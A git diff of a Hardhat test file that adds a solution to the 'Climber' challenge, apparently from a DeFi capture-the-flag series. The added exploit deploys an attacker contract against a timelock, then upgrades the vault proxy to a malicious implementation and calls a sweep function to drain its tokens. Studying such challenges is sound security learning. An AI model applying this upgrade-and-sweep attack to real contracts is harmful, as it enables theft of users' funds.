@@ -1,5 +1,4 @@
 const { ethers, upgrades } = require('hardhat');
-const { ContractFactory } = ethers;
 const { expect } = require('chai');
 
 describe('[Challenge] Climber', function () {
@@ -46,36 +45,18 @@ describe('[Challenge] Climber', function () {
 
   it('Exploit', async function () {
     /** CODE YOUR EXPLOIT HERE */
-    // const targets = [this.timelock.address, this.timelock.address, this.timelock.address, this.timelock.address];
-    // const values = [0, 0, 0, 0];
-    // // const timeLockInterface = await ethers.getContractFactory('ClimberTimelock');
-    // // console.log(timeLockInterface.interface.functions);
-    // const delayFunc = 'function delay()';
-    // const grantRoleFunc = 'function grantRole(bytes32,address)';
-    // const scheduleFunc = 'function schedule(address[],uint256[],bytes[],bytes32)';
-    // let abi = [delayFunc, grantRoleFunc, scheduleFunc];
-    // let iface = new ethers.utils.Interface(abi);
-    // let delayFuncEncode = iface.encodeFunctionData('delay', []);
-    // let grantRoleFuncEncode1 = iface.encodeFunctionData('grantRole', [
-    //   ethers.utils.keccak256('PROPOSER_ROLE'),
-    //   this.timelock.address,
-    // ]);
-    // let grantRoleFuncEncode2 = iface.encodeFunctionData('grantRole', [
-    //   ethers.utils.keccak256('PROPOSER_ROLE'),
-    //   attacker.address,
-    // ]);
-    // let scheduleFuncEncode = iface.encodeFunctionData('schedule', []);
-    // console.log(delayFuncEncode);
 
-    // const ADMIN_ROLE = await ethers.utils.id('ADMIN_ROLE');
-    // const PROPOSER_ROLE = await ethers.utils.id('PROPOSER_ROLE');
-    // console.log('admin role', await this.timelock.hasRole(ADMIN_ROLE, deployer.address));
-    // console.log('proposer role', await this.timelock.hasRole(PROPOSER_ROLE, deployer.address));
-    // await this.timelock.connect(deployer).grantRole(PROPOSER_ROLE, attacker.address);
-    // console.log('proposer role', await this.timelock.hasRole(PROPOSER_ROLE, attacker.address));
-    // console.log((await this.token.balanceOf(this.vault.address)).toString());
+    let RektClimber = await ethers.getContractFactory('RektClimber', attacker);
+    this.rekt = await RektClimber.deploy(this.timelock.address, this.vault.address, attacker.address);
+    await this.rekt.connect(attacker).attack();
 
-    await this.vault.connect(deployer).upgradeToAndCall(attacker.address, '0x');
+    let ClimberVault02 = await ethers.getContractFactory('ClimberVault02', attacker);
+    this.vault02 = await ClimberVault02.deploy();
+
+    const abi = ['function sweepFundsV2(address tokenAddress)'];
+    let iface = new ethers.utils.Interface(abi);
+    let sweepFuncEncode = iface.encodeFunctionData('sweepFundsV2', [this.token.address]);
+    await this.vault.connect(attacker).upgradeToAndCall(this.vault02.address, sweepFuncEncode);
   });
 
   after(async function () {
